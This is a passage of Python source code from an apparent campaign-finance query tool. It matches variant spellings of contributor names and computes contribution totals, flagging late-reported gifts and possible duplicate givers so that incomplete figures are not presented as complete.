    return "".join(c for c in unicodedata.normalize(
        "NFKD", str(text or "").upper().translate(_UNFOLDED)) if not unicodedata.combining(c))


# An initial run into the next word by its point: 'R.Quillon' is R. and Quillon.
_RUN_ON = re.compile(r"(?<![^\W\d_])([^\W\d_]\.)(?=[^\W\d_])")


def _tokens(text: Any) -> list[str]:
    """A name field's tokens (`_TOKEN`), after `_fold`, with an initial run into the next word
    split off, and without tokens that hold no word: a first name filed as '-' is no first
    name, and read as one it stopped the last-name field from being read as a whole name."""
    return [t for t in _TOKEN.findall(_RUN_ON.sub(r"\1 ", _fold(text))) if _WORD.search(t)]


class _Name(NamedTuple):
    """A name as `_could_be` compares it (`_name`)."""
    words: frozenset[str]       # every word, an initial as its letter and a point ('R.')
    surnames: frozenset[str]    # the words spelled out that could be the surname
    spelled: frozenset[str]     # the words that are not initials
    abbreviated: bool           # whether it holds an initial


def _name(last: Any, first: Any = "") -> _Name:
    """A name as its words, case, accents and punctuation aside, so the spellings filers use
    for one name read alike: split, whole in the last-name field, or "LAST, FIRST".

    An initial is kept as its letter and a point ('R.', `_initial`), and only where a given
    name can be: a token of the first-name field, or of the last-name field when the first is
    blank and the last holds more than one token (the whole name filed there). Anywhere else a
    letter is a word, which fits only itself:
    - a one-letter surname ('O'/'Hanu'), which as an initial would stand for every O word;
    - a letter split off inside a word: 'QX&T' is QX and T, and 'Orrin's' is ORRIN and S;
    - a letter with no case, such as a CJK character: a one-character given name is a name,
      not an abbreviation.

    The surname is the last-name field's words when both fields are filled. With either one
    blank, the name was filed whole in the other, and any word spelled out in it could be.
    """
    return _name_of(str(last or ""), str(first or ""))


@functools.lru_cache(maxsize=1 << 17)
def _name_of(last: str, first: str) -> _Name:
    """`_name`, remembered: a ranking asks for every name on it each time it groups them."""
    given = _tokens(first)
    family = _tokens(last)
    words: set[str] = set()
    for tokens, abbreviates in ((given, True), (family, not given and len(family) > 1)):
        for t in tokens:
            letters = t.replace(".", "")
            if (abbreviates and _INITIALS.fullmatch(t)
                    and all(c.lower() != c for c in letters)):
                words.update(f"{c}." for c in letters)
            else:
                words.update(_WORD.findall(t))
    spelled = frozenset(w for w in words if not _initial(w))
    surnames = (frozenset(w for t in family for w in _WORD.findall(t)) if given and family
                else spelled)
    return _Name(frozenset(words), surnames, spelled, len(spelled) < len(words))


def _shown(first: Any, last: Any) -> str:
    """A name as a result shows it: first name first, each part trimmed. A ranking groups on
    trimmed names, so one group's rows can pad a part ("Rue "), and joining the parts untrimmed
    put a double space in a value on some builds and not others."""
    return " ".join(p for p in (str(first or "").strip(), str(last or "").strip()) if p)


def _filed(last: Any, first: Any) -> str:
    """A name as filed, field by field: 'last'/'first'. Two filings that show alike can then be
    told apart: 'Rue Quillon'/'' and 'Quillon'/'Rue' both show as Rue Quillon. Not display only:
    a tie of two such names lists them this way in its value, which a citation records."""
    return f"{str(last or '').strip()!r}/{str(first or '').strip()!r}"


def _initial(word: str) -> bool:
    """Whether a word of `_name` is an initial, which could stand for any word starting with
    its letter."""
    return len(word) == 2 and word[1] == "."


def _word_fits(a: str, b: str) -> bool:
    """Whether two words of names could be one: the same word, or an initial and a word
    starting with its letter, either way round."""
    return a == b or (_initial(a) and b[0] == a[0]) or (_initial(b) and a[0] == b[0])


def _could_be(a: _Name, b: _Name) -> bool:
    """Whether two names could be one giver's. Both must hold:
    - they share a surname: a word spelled out in both that is a surname of one of them
      (`_name`), so names are only ever compared within a surname;
    - each word of the one with fewer words is a different word of the other, or an initial of
      one, either way round (`_word_fits`).
    A name with no words at all could be anyone's.

    So 'Quillon'/'R' could be 'Quillon'/'Rue', and so could 'Quillon'/'R M', each shorter than
    the other somewhere. A middle or first initial, a bare surname, fields swapped, or a short
    form of an organization's name could each be the same giver. Missed: a name spelled
    differently (a typo, a nickname), and one sharing no spelled-out surname with the other
    ('R Q' for Rue Quillon, or 'Quillon' for a 'Rue'/'Q' whose Q might be it).

    It is not transitive: Rue could be R, and R could be Roe, but Rue could not be Roe. It only
    links two names; `_groups` closes it. One word matches one word, so 'Rue'/'R' is not a
    filing of Rue Quillon, which has one R word.
    """
    if not a.words or not b.words:
        return True
    shared = a.spelled & b.spelled
    if not (shared & a.surnames or shared & b.surnames):
        return False
    # The cheap test first: most pairs that could be one are one inside the other.
    if a.words <= b.words or b.words <= a.words:
        return True
    if not (a.abbreviated or b.abbreviated):
        return False   # whole words fit only themselves, so that was the whole test
    few, many = sorted((a.words, b.words), key=len)
    return _each_to_one(few, many)


def _each_to_one(few: frozenset[str], many: frozenset[str]) -> bool:
    """Whether each word of `few` fits a different word of `many`: a matching, found by
    augmenting paths. 'R' has to leave 'Rue' for 'Rue' when both are in `few`. Names are a few
    words long, so this is cheap."""
    # Most pairs fail on a word with nothing in `many` it could be: reject those unmatched.
    letters = {w[0] for w in many}
    if any(w not in many and (w[0] not in letters if _initial(w) else f"{w[0]}." not in many)
           for w in few):
        return False
    targets = sorted(many)
    owner: dict[int, str] = {}

    def place(word: str, seen: set[int]) -> bool:
        for j, other in enumerate(targets):
            if j not in seen and _word_fits(word, other):
                seen.add(j)
                if j not in owner or place(owner[j], seen):
                    owner[j] = word
                    return True
        return False

    return all(place(w, set()) for w in sorted(few))


def _groups(names: dict[Any, _Name]) -> dict[Any, int]:
    """Each key's group: the names `_could_be` links, closed transitively with union-find.

    A group is a safety check, never a figure. No query adds a group's names together, and
    every figure a query reports is for a name exactly as filed. Two names in one group can be
    two people, and the closure over-merges by construction: Rue could be R and R could be
    Roe, so Rue and Roe share a group, and a bare surname joins every giver who has it. That is
    what makes it safe: every giver's names are in one group, so a group's total is an upper
    bound for any real giver in it (CLAUDE.md, "One giver filed two ways is flagged, never
    merged").

    Names link only within a surname (`_could_be`). A name with no words could be anyone's, so
    it is in every group, but it links none: bridged through it, every giver on a committee was
    one group, and a total listed unrelated givers as names that could be the giver's. It gets
    the group `_ANYONE`, which callers count as a member of each group. Pairs are found through an index, never all against all: a ranking
    can hold tens of thousands of names. A name can link with one of at least as many words
    only if that one holds a word `s` they share, a surname of one of them, and for each of its
    other words: that word or its initial, or for an initial, a word starting with its letter.
    So each name is tested only against the names holding `s` beside its rarest such word (as
    a surname, where `s` is not its own), and only while the two are apart. Keying every word
    by its first letter instead made each initial a candidate for every name sharing the
    letter: 4 million tests on 30,000 synthetic names.

    The groups do not depend on the order names come in, only their numbers do, and callers
    compare numbers only with each other.
    """
    by_name: dict[_Name, list[Any]] = {}
    for k, n in names.items():
        by_name.setdefault(n, []).append(k)
    order = list(by_name)
    parent = {v: v for v in order}

    def find(v: _Name) -> _Name:
        while parent[v] is not v:
            parent[v] = parent[parent[v]]
            v = parent[v]
        return v

    def join(a: _Name, b: _Name) -> None:
        ra, rb = find(a), find(b)
        if ra is not rb:
            parent[rb] = ra

    # (a word spelled out, "", another of the name's words, or "^" and the first letter of
    # any of them) -> the names holding both: as any word, and as a surname.
    holding: dict[tuple[str, str], list[_Name]] = {}
    as_surname: dict[tuple[str, str], list[_Name]] = {}
    for v in order:
        beside = ["", *(w for w in v.words), *{f"^{w[0]}" for w in v.words}]
        for s in v.spelled:
            for index in (holding, as_surname) if s in v.surnames else (holding,):
                for x in beside:
                    if x != s:
                        index.setdefault((s, x), []).append(v)

    def partners(index: dict[tuple[str, str], list[_Name]], s: str,
                 x: str) -> list[list[_Name]]:
        # The names that could hold a match for word x beside s: an initial matches any
        # word starting with its letter, and a word matches itself or its initial.
        if _initial(x):
            return [index.get((s, f"^{x[0]}"), [])]
        return [index.get((s, x), []), index.get((s, f"{x[0]}."), [])]

    for v in order:
        size = len(v.words)
        for s in v.spelled:
            # A word that is not this name's surname links only where it is the other's.
            index = holding if s in v.surnames else as_surname
            options = ([partners(index, s, x) for x in v.words if x != s]
                       or [[index.get((s, ""), [])]])
            for part in min(options, key=lambda lists: sum(map(len, lists))):
                for u in part:
                    if (len(u.words) >= size and u is not v and find(u) is not find(v)
                            and _could_be(v, u)):
                        join(v, u)

    ids: dict[_Name, int] = {}
    return {k: _ANYONE if not v.words else ids.setdefault(find(v), len(ids))
            for v in order for k in by_name[v]}


# The group of a name with no words (`_groups`): it could be in any group.
_ANYONE = -1


# A name's key, as `_givers` groups it: last and first name, each through `_name_key`.
_KL = "vg_name_key({t}.CTRIB_NAML)"
_KF = "vg_name_key({t}.CTRIB_NAMF)"


def _name_key(part: Any) -> str:
    """One part of a name's key (`_KL`, `_KF`, the cross-form dedup's and the late-report
    restatement's), and how a result orders and compares the names it shows: Unicode-normalized
    (NFKC), trimmed and case-folded, in Python. SQLite's TRIM and UPPER know only ASCII spaces
    and letters, so a surname filed with a trailing tab or non-breaking space was a name of its
    own that displayed like the plain one ("Rue Abbot | Rue Abbot"), and 'José' and 'JOSÉ' were
    two givers, each short. Upper-casing without normalizing still split 'José' written with a
    combining accent from the one written with 'é'. `calaccess.connect` registers it as
    vg_name_key. The dedup has to use the same key as the names: with ASCII rules there and
    these here, a gift's two copies filed 'Élise' and 'élise' stayed apart and were summed under
    one name. Normalized again after folding, since folding can leave a string unnormalized."""
    text = unicodedata.normalize("NFKC", str(part or "")).strip()
    return unicodedata.normalize("NFKC", text.casefold())


def _named(keys: list[tuple[str, str]]) -> Any:
    """(SQL keeping the receipts `r` filed under `keys`, its args), in chunks: each name is two
    SQL variables, and SQLite before 3.32 takes 999 in all."""
    keys = list(dict.fromkeys(keys))
    for i in range(0, len(keys), 400):
        chunk = keys[i:i + 400]
        yield (f" AND ({_KL.format(t='r')}, {_KF.format(t='r')}) IN "
               f"(VALUES {', '.join(['(?, ?)'] * len(chunk))})",
               [part for key in chunk for part in key])


def _givers(con: Any, filer_id: str, form_type: str,
            only: list[tuple[str, str]] | None = None) -> list[Any]:
    """Every name a filer's receipts on `form_type` ("" for every schedule) are filed under,
    with its total, largest first and equal totals by name: what a ranking ranks. Or only the
    names in `only`, as (kl, kf) keys. A name is its last and first name, trimmed and ignoring
    case, so one giver filed two ways is two names here. A missing name part groups as a blank
    one, so every key is text and sorts.

    `pos` sums the gifts with a readable amount above zero and `unread` counts those with none,
    which `amt` and `n` leave out: the two a group's upper bound is made of
    (`_could_change_ranking`)."""
    schedule, schedule_args, _ = _schedule(form_type)
    if only is not None:
        found = [g for extra, args in _named(only)
                 for g in _ranked(con, filer_id, schedule + extra, [*schedule_args, *args])]
        return sorted(found, key=lambda g: (-float(g["amt"] or 0), g["kl"], g["kf"]))
    return _ranked(con, filer_id, schedule, schedule_args)


def _ranked(con: Any, filer_id: str, extra: str, args: list[Any]) -> list[Any]:
    """`_givers`, for the receipts `extra` keeps."""
    # MIN, not a bare column: a group's rows can spell its name in another case or with padding,
    # and a bare column is whichever row SQLite reads, so the value's spelling could change
    # with the order the rows were loaded in. Amounts are read as the sums read them
    # (`amount_sql()`): `amt` and `n` count only gifts with a readable amount, and a name
    # whose every gift has none sums to NULL, which sorts last.
    return con.execute(f"""
        SELECT MIN(d.CTRIB_NAML) nm, MIN(d.CTRIB_NAMF) nf, SUM(d.AMT) amt, COUNT(d.AMT) n,
               {_KL.format(t='d')} kl, {_KF.format(t='d')} kf,
               SUM(CASE WHEN d.AMT > 0 THEN d.AMT ELSE 0 END) pos,
               COUNT(*) - COUNT(d.AMT) unread
        FROM ({DEDUPED_RECEIPTS.format(extra=extra)}) d
        GROUP BY {_KL.format(t='d')}, {_KF.format(t='d')}
        ORDER BY amt DESC, kl, kf
    """, [str(filer_id), *args]).fetchall()


def _name_sql(alias: str, first: bool) -> str:
    """SQL matching a contributor's name as filed on table `alias`: CTRIB_NAML exactly, and
    CTRIB_NAMF too when `first`. Its args are the name, then the first name. One rule for the
    rows a total sums and the names it holds against it: two copies that drifted apart would
    flag the counted name as another one."""
    sql = f"{_KL.format(t=alias)} = vg_name_key(?)"
    if first:
        sql += f" AND {_KF.format(t=alias)} = vg_name_key(?)"
    return sql


def _whereabouts(places: list[str], employers: list[str]) -> str:
    """How a flag says where a name's gifts came from: its cities and ZIPs, and its employers,
    each as filed. Display only."""
    def few(values: list[str]) -> str:
        distinct = sorted({v for v in values if v}, key=str.casefold)
        return " / ".join(distinct[:3]) + (" / ..." if len(distinct) > 3 else "")

    parts = [few(places)] + ([f"employer {e}"] if (e := few(employers)) else [])
    return ", ".join(p for p in parts if p)


def _identity(con: Any, filer_id: str, form_type: str,
              keys: list[tuple[str, str]]) -> dict[tuple[str, str], str]:
    """Where each name's receipts on `form_type` came from, as `_whereabouts` says it, so a
    person resolving a flag can tell two givers apart without querying again. Only what the
    database loaded: one built before CTRIB_CITY and CTRIB_ZIP4 were has only employers.
    Display only."""
    cols = {r[1] for r in con.execute('PRAGMA main.table_info("RCPT_CD")')}

    def col(name: str) -> str:
        return f"TRIM(COALESCE(r.{name}, ''))" if name in cols else "''"

    schedule, schedule_args, _ = _schedule(form_type)
    seen: dict[tuple[str, str], tuple[list[str], list[str]]] = {}
    for extra, args in _named(keys):
        for r in con.execute(f"""
            SELECT DISTINCT {_KL.format(t='r')} kl, {_KF.format(t='r')} kf,
                   {col('CTRIB_CITY')} city, {col('CTRIB_ZIP4')} zip, {col('CTRIB_EMP')} emp
            FROM RCPT_LATEST r JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
            WHERE f.FILER_ID = ?{schedule}{extra}
        """, [str(filer_id), *schedule_args, *args]):
            places, employers = seen.setdefault((r["kl"], r["kf"]), ([], []))
            places.append(f"{r['city']} {r['zip']}".strip())
            employers.append(r["emp"])
    return {k: _whereabouts(*v) for k, v in seen.items()}


def _name_line(g: Any, where: str = "") -> str:
    """One name a flag lists: as filed, with its figure and where its gifts came from. Display
    only."""
    if g["n"]:
        held = (f"${float(g['amt']):,.2f} in {g['n']} gift(s)"
                + (f" and {g['unread']} more with no readable amount" if g["unread"] else ""))
    else:
        held = f"{g['unread']} gift(s) with no readable amount"
    return f"{_filed(g['nm'], g['nf'])} {held}" + (f" ({where})" if where else "")


def _names_note(others: list[Any], where: dict[tuple[str, str], str], then: str = "") -> str:
    """How a detail names the other names in a giver's group, `then` following them. Display
    only."""
    if not others:
        return ""
    listed = "; ".join(_name_line(g, where.get((g["kl"], g["kf"]), "")) for g in others[:4])
    return (f"{len(others)} other name{'' if len(others) == 1 else 's'} that could be this "
            f"giver's, or another giver's ({listed}{'; ...' if len(others) > 4 else ''})" + then)


def _late_order(e: dict[str, Any]) -> tuple[Any, ...]:
    """The order `_pending_late` gives late entries: by date and filing, then by what they
    hold, never by load order within a filing and a day, since which name a late giver is
    shown under, and where it falls among equals, come from the first entry read."""
    # The amount as read, not as filed: one gift merged from "100" and "100.00" keeps
    # whichever text it read first.
    return (e["d"] or "", e["filing_id"], str(e["tbase"]), _name_key(e["naml"]),
            _name_key(e["namf"]), e["amt"] is None, e["amt"] or 0.0)


def _late_reports(con: Any, filer_id: str, form_type: str) -> list[dict[str, Any]]:
    """The pending late entries a result on `form_type` leaves out. Which of them could be one
    contributor's is their group's to say (`_groups`).

    For schedule A, every pending entry. For every schedule (""), the Form 497 entries only:
    that sum holds every Form 496 Part 3 row, under the name it was filed under. For any other
    schedule, none, and nothing is read. For A or "", a database that cannot read Form 497
    cannot say none is pending, so it refuses like a degraded one does, whether or not the
    schedule was named: a figure it could not check would otherwise verify green
    (`QueryResult.unsettled`).
    """
    from . import calaccess

    schedule = form_type.strip().upper()
    if schedule not in ("A", ""):
        return []
    if not calaccess.late_reports_loaded(con):
        raise calaccess.DegradedDatabase(calaccess.LATE_FALLBACK)
    # A stated $0 changes no total and moves no one in a ranking, so it holds nothing.
    late = [e for e in _pending_late(con, filer_id) if e["amt"] != 0]
    if not schedule:
        # Every schedule sums every Form 496 Part 3 row, each under the name it was filed
        # under. One filed under another name that could be the giver's ("DOE JANE" whole in
        # the last-name field) is another name on that schedule, and the name check holds it
        # against a figure for the giver like any other name (`_groups`): one rule for "could
        # be one giver", not a second check here.
        late = [e for e in late if "F496P3" not in e["forms"]]
    return late


def _by_report(entries: list[dict[str, Any]]) -> list[LateReport]:
    """Pending late entries grouped by the filing to open, for `QueryResult.late`: those with
    an amount nobody stated first, since it could be anything, then the most money either way.
    Not the net: a gift and its correction on one report net to $0 and could still move a
    figure, since either could be the one a 460 restates.

    A gift on both late forms is filed under its earliest filing, with that filing's own form
    and amendment, and names the other filing as `also`."""
    reports: dict[int, LateReport] = {}
    for e in entries:
        form, amend = e["copies"][e["filing_id"]]
        r = reports.setdefault(e["filing_id"], LateReport(
            filing_id=e["filing_id"], amend_id=amend, forms=frozenset(), also=frozenset(),
            amount=0.0, gross=0.0, entries=0, unread=0))
        a = e["amt"]
        r.forms |= {form}
        r.also |= set(e["copies"]) - {e["filing_id"]}
        r.amount += a or 0.0
        r.gross += abs(a or 0.0)
        r.entries += 1
        r.unread += a is None
    return sorted(reports.values(), key=lambda r: (-bool(r.unread), -r.gross, r.filing_id))


def _late_note(entries: list[dict[str, Any]], then: str = "") -> str:
    """How a detail names the late entries left out, `then` following them. Display only."""
    if not entries:
        return ""
    reports = _by_report(entries)
    stated = sum(r.amount for r in reports)
    unread = sum(r.unread for r in reports)
    ids = sorted(r.filing_id for r in reports)
    return (f"{len(entries)} late-report entr{'y' if len(entries) == 1 else 'ies'} "
            f"(${stated:,.2f}"
            + (f"; {unread} with no readable amount" if unread else "")
            + f"; filing {', '.join(map(str, ids[:4]))}{', ...' if len(ids) > 4 else ''})"
            " not yet restated on a Form 460 schedule A" + then)


# What a figure asked for by schedule says when it leaves late entries out. The number
# reproduces, and whether the sentence around it holds is for the person the row goes to
# (`QueryResult.unsettled`).
NOT_COMPLETE = (", not counted — a figure for this schedule as filed, NOT a complete total; "
                "do not word it as one")
# And a figure asked for as filed, when it leaves out other names in the giver's group.
AS_FILED = (", not counted — a figure for this name as filed, NOT a complete total; do not "
            "word it as one")
# How a ranking names what it would not count as one giver. Display only.
SPLIT = "names ranked apart that could be one giver's"


def _gate(form_type: str | None) -> tuple[bool, str]:
    """(whether late reports gate the result, the schedule to count). Unset means schedule A,
    a miss while a late report could change it; "A" by name means schedule A as filed, held
    for a person while one could (`QueryResult.late`)."""
    return form_type is None, "A" if form_type is None else form_type



def _names_gate(names: str) -> bool:
    """Whether other names in the giver's group gate the result: unless names=as_filed, which
    counts the name asked for alone, or ranks each name apart, and names the others. A switch
    of its own, not form_type's: with one way past both gates, getting past a name nobody could
    place also let a pending late gift through."""
    if names not in ("", "as_filed"):
        raise ValueError(f"names must be 'as_filed', or unset to hold other names against the "
                         f"result, not {names!r}")
    return not names


def _contributor_total(root: Path, *, filer_id: str, contributor: str,
                       contributor_first: str = "", form_type: str | None = None,
                       names: str = "") -> QueryResult:
    """Total itemized contributions from one contributor to one filer.

    For an INDIVIDUAL pass `contributor_first` too: CTRIB_NAML holds only the surname, so a
    common surname alone summed unrelated donors into one six-figure contributor who does not
    exist. Organizations keep their whole name in CTRIB_NAML, so they need only `contributor`.

    `form_type` defaults to A (monetary contributions received), as `filer_total` does. The
    receipts table holds every receipt schedule, so without it an in-kind item (C) was summed
    as a gift, and a vendor's refund or a bank's interest (I) made a business that gave nothing
    a contributor. Pass another schedule to count that one, or "" for every schedule.

    Left unset, it is a miss while a late-reported gift no schedule A restates yet
    (`_pending_late`) is in this contributor's group (`_groups`): the schedule-A sum could then
    be short of what they gave. Pass form_type=A for the schedule-A figure alone. It still does
    not verify while such a gift is pending (`QueryResult.unsettled`): a person opens the late
    reports it names.

    The figure is always for the name as filed: `contributor` against CTRIB_NAML, and
    `contributor_first` against CTRIB_NAMF, exactly. Filers don't reliably split or spell out
    names, so one giver can also be 'Rue Quillon'/'' or 'Quillon'/'R'. Those names are never
    added to the figure, and never silently left out of it either: the figure is a miss while
    the name's group holds any other name with receipts on this schedule, unless
    names=as_filed, which gives the figure for this name alone, for a person to check against
    the other names it lists (`QueryResult.unsettled`).
    """
    from . import calaccess

    gated, form_type = _gate(form_type)
    names_gated = _names_gate(names)
    _schedule(form_type)   # refuses a padded form_type before anything is opened
    con = calaccess.connect_citable(root)
    try:
        return _contributor_figure(con, filer_id, contributor, contributor_first, form_type,
                                   gated, names_gated)
    finally:
        con.close()


def _contributor_figure(con: Any, filer_id: str, contributor: str, contributor_first: str,
                        form_type: str, gated: bool, names_gated: bool) -> QueryResult:
    """`_contributor_total`, on an open connection."""
    late = _late_reports(con, filer_id, form_type)
    first = bool(contributor_first)
    who = " AND " + _name_sql("r", first)
    who_args: list[Any] = [contributor] + ([contributor_first] if first else [])
    schedule, schedule_args, label = _schedule(form_type)
    args: list[Any] = [str(filer_id)] + who_args + schedule_args
    inner = DEDUPED_RECEIPTS.format(extra=who + schedule)
    row = con.execute(f"""
        SELECT SUM(d.AMT) amt, COUNT(d.AMT) n, COUNT(*) gifts,
               GROUP_CONCAT(DISTINCT CASE WHEN d.AMT IS NOT NULL THEN d.FILING_IDS END) ids
        FROM ({inner}) d
    """, args).fetchone()
    n, gifts = int(row["n"] or 0), int(row["gifts"] or 0)

    # Every name the filer's receipts on this schedule are filed under, and whether the figure
    # counts it. Listed before anything is summed: summing every name first took ten times as
    # long as the figure itself, on a synthetic committee of 60,000 gifts.
    listed = con.execute(f"""
        SELECT {_KL.format(t='r')} kl, {_KF.format(t='r')} kf, MAX({_name_sql('r', first)}) mine,
               MIN(r.CTRIB_NAML) nm, MIN(r.CTRIB_NAMF) nf
        FROM RCPT_LATEST r JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
        WHERE f.FILER_ID = ?{schedule}
        GROUP BY kl, kf
    """, [*who_args, str(filer_id), *schedule_args]).fetchall()
    counted = {("name", r["kl"], r["kf"]) for r in listed if r["mine"]}
    # A key is for comparing; a name is shown as filed, its least spelling as the ranking's is.
    filed_as = {("name", r["kl"], r["kf"]): (r["nm"], r["nf"]) for r in listed}
    on_schedule = {("name", r["kl"], r["kf"]): _name(r["kl"], r["kf"]) for r in listed}
    late_names = {("late", i): _name(e["naml"], e["namf"]) for i, e in enumerate(late)}
    asked = {("asked",): _name(contributor, contributor_first)}

    def group(*parts: dict[Any, _Name]) -> list[Any]:
        # The group of the names the figure counts, or of the name asked for when it counts
        # none. Not the asked-for name beside counted ones: a surname alone would join every
        # giver who has it, and another Quillon's whole name is not a name of this Rue's.
        words = {k: w for part in parts for k, w in part.items()}
        of = _groups(words)
        seeds = {of[k] for k in (counted or asked)} | {_ANYONE}
        if _ANYONE in {of[k] for k in (counted or asked)}:
            seeds = set(of.values())   # a name with no words could be anyone's
        return [k for k in words if of[k] in seeds and k not in counted and k not in asked]

    seed = {} if counted else asked
    # The name check groups the names on the schedule alone. A late entry that links this name
    # to another is in its group for the late check, which form_type=A lifts; it does not hold
    # the other name against the figure once it does.
    others = [(k[1], k[2]) for k in group(on_schedule, seed)]
    together = group(on_schedule, late_names, seed) if late else []
    theirs = [late[k[1]] for k in together if k[0] == "late"]
    # Names on the schedule a late entry links to this one: shown with the late entries held,
    # since the late report alone may look too small to matter.
    linked = [(k[1], k[2]) for k in together if k[0] == "name" and (k[1], k[2]) not in others]

    def other_names() -> tuple[list[Any], dict[tuple[str, str], str]]:
        rows = _givers(con, filer_id, form_type, others)
        return rows, _identity(con, filer_id, form_type, [(g["kl"], g["kf"]) for g in rows[:4]])

    if gifts == 0:
        # A zero here is ambiguous and dangerous: it reads as "this donor gave nothing" when
        # it usually means the name was typed slightly differently ("… PAC" vs "… PAC SCC").
        # Never let a miss masquerade as a finding. Names come from the schedule searched: a
        # near-match on another one is a receipt, not the contributor that was meant.
        near = [" ".join(x for x in (r["nf"], r["nm"]) if x) for r in con.execute(f"""
            SELECT DISTINCT r.CTRIB_NAML nm, r.CTRIB_NAMF nf FROM RCPT_LATEST r
            JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
            WHERE f.FILER_ID = ? AND UPPER(r.CTRIB_NAML) LIKE UPPER(?){schedule}
            LIMIT 6
        """, [str(filer_id), f"%{contributor.split()[0]}%" if contributor.split() else "%"]
             + schedule_args)]
        # The name matched, on a schedule this did not count: say where, rather than leave
        # "no match" to send the researcher off retyping a name that was right.
        note, hint = _elsewhere(con, filer_id, form_type, who, who_args)
        if names_note := _names_note(*other_names()):
            note += f"; {names_note}"
        if late_note := _late_note(theirs):
            note += f"; {late_note}"
        omitted = _left_out_receipts(con, str(filer_id), who + schedule, args[1:])
        return QueryResult(value=None, rows=0, found=False, suggestions=hint + near,
                           detail=f"0 itemized {label} gift(s){note}", omitted=omitted)

    if not first:
        # Summing several people under one surname is how a nonexistent contributor appeared.
        # Whatever the gates: the names it counts, and the late givers who could be the name
        # asked for. Asked pairwise, never through `_groups`: a closure over-merges, which
        # bounds a figure safely and counts people short. A bare 'Quillon' links Rue and Tom,
        # and they are still two.
        spans = {on_schedule[k]: _filed(*filed_as[k]) for k in counted}
        spans.update({late_names[k]: f"{_filed(e['naml'], e['namf'])} (late)"
                      for k, e in zip(late_names, late)
                      if _could_be(late_names[k], asked[("asked",)])})
        firsts = sorted({k[2]: str(filed_as[k][1] or "").strip() for k in counted}.values(),
                        key=lambda f: (_name_key(f), f))
        if any(not _could_be(a, b) for a, b in itertools.combinations(spans, 2)):
            return QueryResult(
                value=None, rows=gifts, found=False,
                detail=f"{gifts} itemized {label} gift(s) across DIFFERENT first names, which "
                       "cannot all be one giver's ("
                       + ", ".join(sorted(set(spans.values()), key=lambda v: (_name_key(v), v)))
                       + ") — this is not one contributor; pass contributor_first")
        if len(firsts) > 1:
            # R and Rue could be one giver's, or two givers': either way, not a figure for one
            # name as filed.
            return QueryResult(
                value=None, rows=gifts, found=False,
                detail=f"{gifts} itemized {label} gift(s) across {len(firsts)} first names that "
                       f"could be one giver's or {len(firsts)} givers' "
                       f"({', '.join(repr(f) for f in firsts)}) — not one contributor as filed; "
                       "pass contributor_first")
    left_out = _unread(gifts - n)
    omitted = _left_out_receipts(con, str(filer_id), who + schedule, args[1:])
    rows, where = other_names() if others else ([], {})
    if n == 0:
        # The name matched, but no gift states an amount: unknown money, never "$0.00". A
        # left-out gift that states one would make it a figure, so the miss carries it.
        note = "; ".join(x for x in (_names_note(rows, where), _late_note(theirs)) if x)
        miss = _no_rows(f"0 itemized {label} gift(s) counted{left_out}"
                        + (f"; {note}" if note else ""))
        miss.omitted = omitted
        return miss
    total = float(row["amt"])
    detail = f"{n} itemized {label} gift(s){left_out}"
    held_names = rows + (_givers(con, filer_id, form_type, linked) if linked and theirs else [])
    # A figure known to be short, or that could be. Green, it is a finding: "gave $5,000", a
    # week after a $50,000 late gift, or beside $5,000 more filed under the whole name. Not
    # flagged for a left-out schedule: it counts gifts, so the flag's note would be false, and
    # form_type=A or names=as_filed carries it.
    causes, fixes = [], []
    if gated and theirs:
        causes.append(_late_note(theirs))
        fixes.append("form_type=A gives the schedule-A figure alone, for a person to check "
                     "against these late reports")
    if names_gated and rows:
        causes.append(_names_note(rows, where))
        fixes.append("names=as_filed gives the figure under this name alone, for a person to "
                     "check against these names")
    if causes:
        return QueryResult(value=None, rows=n, found=False,
                           suggestions=[f.split(" ")[0] for f in fixes],
                           detail=f"${total:,.2f} across {detail}, but {' and '.join(causes)} — "
                                  f"not a complete total; {'; and '.join(fixes)}")
    if note := _late_note(theirs, NOT_COMPLETE):
        detail += f"; {note}"
    if note := _names_note(rows, where, AS_FILED):
        detail += f"; {note}"
    # Asked for by a named schedule or as filed, the figure goes to a person while a late gift
    # or another name could change it: the note alone would render green.
    return QueryResult(value=total, rows=n, detail=detail,
                       unrestated=_receipt_shares(con, inner, args, row["ids"]),
                       omitted=omitted, late=_by_report(theirs),
                       names=[_name_line(g, where.get((g["kl"], g["kf"]), ""))
                              for g in held_names])


def _filer_total(root: Path, *, filer_id: str, form_type: str | None = None) -> QueryResult:
    """Total itemized contributions received by a filer.

    `form_type` defaults to A (monetary contributions received). Without it the total mixed
    schedules A, C and I and came out hundreds of thousands of dollars high: a plausible-looking
    number answering a question nobody asked. Pass another schedule to count that one, or ""
    for every schedule.

    Left unset, it is a miss while the filer has a late-reported gift no schedule A restates yet
    (`_pending_late`), as `contributor_total` is. form_type=A gives the schedule-A figure alone,
    which does not verify while one is pending (`QueryResult.unsettled`).
    """
    from . import calaccess

    gated, form_type = _gate(form_type)
    schedule, schedule_args, label = _schedule(form_type)
    con = calaccess.connect_citable(root)
    late = _late_reports(con, filer_id, form_type)
    inner = DEDUPED_RECEIPTS.format(extra=schedule)
    args: list[Any] = [str(filer_id)] + schedule_args
    row = con.execute(f"""
        SELECT SUM(d.AMT) amt, COUNT(d.AMT) n, COUNT(*) gifts,
               GROUP_CONCAT(DISTINCT CASE WHEN d.AMT IS NOT NULL THEN d.FILING_IDS END) ids
        FROM ({inner}) d
    """, args).fetchone()
    n, gifts = int(row["n"] or 0), int(row["gifts"] or 0)
    left_out = _unread(gifts - n)
    omitted = _left_out_receipts(con, str(filer_id), schedule, schedule_args)
    if n == 0:
        note, hint = _elsewhere(con, filer_id, form_type)
        con.close()
        late_note = _late_note(late)
        miss = _no_rows(f"no {label} contributions" + (" counted" if left_out else "")
                        + f" for filer {filer_id}{left_out}{note}"
                        + (f"; {late_note}" if late_note else ""), hint)
        miss.omitted = omitted
        return miss
    detail = f"{n} itemized {label} gift(s){left_out}"
    if late and gated:
        # not flagged for a left-out schedule, as in contributor_total: form_type=A carries both
        con.close()
        return _no_rows(f"${float(row['amt']):,.2f} across {detail}, but "
                        f"{_late_note(late)} — not a complete total; form_type=A gives the "
                        "schedule-A figure alone, for a person to check against these late "
                        "reports", ["form_type=A"])
    unrestated = _receipt_shares(con, inner, args, row["ids"])
    con.close()
    note = _late_note(late, NOT_COMPLETE)
    return QueryResult(value=float(row["amt"]), rows=n,
                       detail=detail + (f"; {note}" if note else ""), unrestated=unrestated,
                       omitted=omitted, late=_by_report(late))


